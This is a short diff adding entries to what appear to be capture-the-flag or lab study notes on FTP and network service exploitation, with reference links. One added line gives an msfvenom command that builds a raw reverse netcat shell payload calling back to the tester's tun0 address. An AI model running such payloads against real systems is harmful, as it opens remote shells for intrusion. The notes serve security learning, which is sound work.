@@ -368,3 +368,14 @@ XXX
 * -U Anonymous
 * help/history/pwd/ls/cd/stat/q/exit/quit/more/get/put
 * check id_rsa.pub to find the username (?)
+
+* sudo tcpdump ip proto \\icmp -i tun0
+* tcpdump listener, specifically listening for ICMP traffic
+* msfvenom -p cmd/unix/reverse_netcat lhost=tun0 lport=4444 R
+* R = export the payload in raw format
+
+* FTP 2 channels: command also called control
+* https://www.jscape.com/blog/countering-packet-sniffers-using-encrypted-ftp
+* https://gregit.medium.com/exploiting-simple-network-services-in-ctfs-ec8735be5eef
+* https://attack.mitre.org/techniques/T1210/
+* https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
